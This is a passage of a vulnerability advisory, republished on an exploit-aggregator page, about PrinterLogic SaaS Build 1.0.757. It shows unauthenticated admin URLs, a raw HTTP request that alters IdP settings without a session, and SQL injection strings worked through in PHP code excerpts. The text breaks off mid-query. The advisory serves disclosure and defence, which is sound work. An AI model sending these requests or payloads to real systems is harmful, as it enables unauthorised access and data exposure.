---
title: PrinterLogic Build 1.0.757 XSS / SQL Injection / Authentication Bypass exploit
url: https://sploitus.com/exploit?id=PACKETSTORM:172643&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-05-31
fetch_date: 2025-10-04T11:36:58.248432
---

# PrinterLogic Build 1.0.757 XSS / SQL Injection / Authentication Bypass exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for PrinterLogic Build 1.0.757 XSS / SQL Injection / Authentication Bypass

2023-05-30 | CVSS 7.1

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=PACKETSTORM:172643
PrinterLogic SaaS, multiple vulnerabilities
===========================================================
PrinterLogic's Enterprise Print Management software allows IT
professionals to simplify printer driver management and empower end
users.
-- https://www.printerlogic.com/

Background
----------------------------------
The following findings were identified by performing both dynamic
testing of the PrinterLogic SaaS platform and code analysis of the
source code contained in the virtual appliance available for download
from the PrinterLogic website (Build 1.0.757: July 29th, 2022).

Credit
-----------------------------------
The vulnerabilities were discovered by Eldar Marcussen, Gareth
Phillips, Jeff Thomas, Luke Symons, Nadeem Salim, Stephen Bradshaw,
Tony Wu and Yianna Paris.

OVE-20230524-0001 Authentication bypass
===========================================================
As the application is not using a central framework for handling
authentication and authorization the individual PHP files must all
implement authentication and authorization checks in a consistent same
way. However, this is not the case and many of the administrative
files are missing authentication checks completely, allowing
unauthenticated access to administrative scripts via their direct
URLs.

For example:
* https://example.printercloud10.com/admin/query/reports.php?action=start_database_query&export=0&report_type=Overview+-+By+Week&sort_by=&sort_order=0&page=1&start_date=2023%2F01%2F11&stop_date=2023%2F01%2F11&start_time=12%3A00+AM&stop_time=11%3A59+PM&time_offset=39600&order=&user_name=&job_title=&computer_name=&manager_name=&department_name=&printer_name=&printer_type=printer_type_tcpip&job_type=job_type_scan&user_name_wildcard=*&company_name_wildcard=*&job_title_wildcard=*&manager_name_wildcard=*&department_name_wildcard=*&printer_name_wildcard=*&folder_path=Test&show_tcpip_printers=1&show_usb_printers=1&show_folder_accumulate=0

* https://example.printercloud10.com/admin/api/advanced-groups?limit=25

It also appears possible for an unauthenticated attacker to alter the
idp configuration of the SaaS service, however due to lack of
integration this was not tested further, the following request
contains no authentication or session details, but did receive a `{
"message":"success"}` json response:
```
PUT /api/authn/save-idp-settings HTTP/2
Host: example.printercloud10.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0)
Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Type: application/json
Content-Length: 2

{}
```

OVE-20230524-0002 SQL injection
===========================================================
Overall the application does not use parameterized queries when
retrieving data, but rather uses a custom DAO framework which utilises
several escaping functions that attempt to prevent SQL injection using
various string handling functions. These are either custom functions -
a practice that is not recommended, or rely on
mysqli_real_escape_string(), which has a number of flaws, resulting in
conditions where SQL injection is possible. For example, the following
function that tries to avoid injection via the backtick character is
flawed as it does not also handle escape sequences:

```php
public function escapeMySQLSchemaName($identifier) { return "`" .
str_replace("`", "``", $identifier) . "`"; }
```

If an attacker supplied the string ```abc\`,injected``` then function
would return ```abc\``,injected``` where the first backtick is escaped
and the second terminates an existing backtick defined string.

In some cases, input does not appear to be filtered or validated at
all. For example, the offset parameter in the admin/query/reports.php
script mentioned in the authentication bypass issue,
We can simulate this by combining the functions from the different
files as follows and see that the offset value is successfully
injected, however due to how MySQL handles group by expressions it
would be difficult to find an injection payload that doesn't break the
SQL syntax and has a valid group by statement.

```php
// print_stat_dao.php gets called from overview_total_per_week()
function per_week_columns($time_offset) {
// Use UTC for the "WHERE" clause (since printed, $start and $stop
are in UTC), but local time for everything else
$local_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
return "WEEK($local_printed, 2) AS current_week,
YEAR($local_printed) AS current_year,
$local_printed AS local_printed
";
}

function per_week_group_by($time_offset) {
$adjusted_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
return "WEEK($adjusted_printed, 2)";
}

function per_week_order_by($time_offset) {
$adjusted_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
return "YEAR($adjusted_printed), WEEK($adjusted_printed, 2)";
}

function per_year_group_by($time_offset) {
$adjusted_printed = "TIMESTAMPADD(SECOND, $time_offset, printed)";
return "YEAR($adjusted_printed)";
}

// print_stat_dao.php helper function
// Date allows invalid data in time_offset
// is_valid_date_time does not, but offset isn't used there (FTW!)
function create_start_stop_dates($start_date, $start_time, $stop_date,
$stop_time, $time_offset) {
// Convert dates to UTC
$start = $start_date . " " . $start_time;
$stop = $stop_date . " " . $stop_time;
if (!is_valid_date_time($start_date, $start_time)) {
echo "Invalid start date/time: $start";
return false;
}
if (!is_valid_date_time($stop_date, $stop_time)) {
echo "Invalid end date/time: $stop";
return false;
}
if (strtotime($start) > strtotime($stop)) {
echo "Start date/time is later than end date/time: $start > $stop";
return false;
}

$start = date("Y-m-d H:i:00", strtotime($start_date . " " .
$start_time) - $time_offset);
$stop = date("Y-m-d H:i:59", strtotime($stop_date . " " .
$stop_time) - $time_offset);
return array($start, $stop);
}

// Helper function requires specific formats for start/stop date/time
function is_valid_date_time($date, $time) {
$format = "Y/m/d h:i A";
$date = $date . " " . $time;
$current = DateTime::createFromFormat($format, $date);
if (!$current)
return false;
return $current && $current->format($format) == $date;
}

// Simulate user supplied data and flow for overview_total_per_week()
in print_stat_dao.php
// This gets called from ../../helpers/reports.php for the following
report type:
// case "Overview - By Week":
// 101 array_push($ids,
// 102
$print_stat_dao->overview_total_per_week($start_date, $start_time,
$stop_date, $stop_time, $time_offset));
$time_offset="600, injected)) -- ";
$start_date="2021/01/01";
$start_time="11:25 AM";
$stop_date="2021/01/01";
$stop_time="11:55 AM";

$dates = create_start_stop_dates($start_date, $start_time, $stop_date,
$stop_time, $time_offset);
//var_dump($dates);
$start = $dates[0];
$stop = $dates[1];
$per_week_columns = per_week_columns($time_offset);
$per_year_group_by = per_year_group_by($time_offset);
$per_week_group_by = per_week_group_by($time_offset);
$per_week_order_by = per_week_order_by($time_offset);
$permissions_filtered_print_stats_where_clause = "1=1";

$query = "
SELECT
SUM(mono_duplex_count + mono_simplex_count +
color_duplex_count + color_simplex_count) as total_pages,
SUM(mono_duplex_cost + mono_simplex_cost + color_duplex_cost
+ color_simplex_cost) AS total_cost,
$per_week_columns
FROM
ppp_print_stats
WHERE
(printed BETWEEN '$start' AND '$stop') and (job_type <> 4) and
($permissions_filtered_print_stats_where_clause)
GROUP BY
$per...